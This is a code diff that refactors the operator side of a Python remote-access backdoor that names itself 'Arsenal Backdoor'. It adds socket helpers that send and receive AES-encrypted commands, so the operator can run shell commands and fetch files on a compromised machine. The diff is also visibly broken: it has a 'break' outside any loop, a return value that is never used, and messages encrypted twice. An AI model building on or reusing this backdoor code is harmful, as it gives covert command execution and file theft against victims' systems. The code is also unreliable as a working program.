@@ -37,20 +37,30 @@ def do_decrypt(ciphertext):
     message = obj2.decrypt(ciphertext)
     return message[:-message[-1]]
 
+def get_data(conn):
+    bs = conn.recv(8)
+    try:
+        (length,) = struct.unpack('>Q', bs)
+    except struct.error as err:
+        print("{0}".format(err))
+        break
+    data = b''
+    while len(data) < length:
+        to_read = length - len(data)
+        data += conn.recv(buff if to_read > buff else to_read)
+    return data
+
+def sendit(conn, output):
+    message = do_encrypt(output)
+    print(message)
+    length = pack('>Q', len(message))
+    conn.sendall(length)
+    conn.sendall(message)
+
 def client(conn, addr, buff):
     conn.send(do_encrypt('Arsenal Backdoor'))
     while True:
-        holder = []
-        bs = conn.recv(8)
-        try:
-            (length,) = struct.unpack('>Q', bs)
-        except struct.error as err:
-            print("{0}".format(err))
-            break
-        data = b''
-        while len(data) < length:
-            to_read = length - len(data)
-            data += conn.recv(buff if to_read > buff else to_read)
+        get_data(conn)
         print('\n'+str(do_decrypt(data).strip(), 'utf-8'))
         while True:
             try:
@@ -61,11 +71,11 @@ def client(conn, addr, buff):
                 print('update_key\nget_file /path/to/file')
             elif reply == "update_key":
                 foo,bar,bat = update_aeskeys()
-                conn.send(do_encrypt(foo, bar, bat))
+                sendit(conn, do_encrypt(foo, bar, bat))
             elif reply.strip() == '':
                 continue
             else:
-                conn.send(do_encrypt('cmd ' + reply))
+                sendit(conn, do_encrypt('cmd ' + reply))
                 break
         if not data:
             break
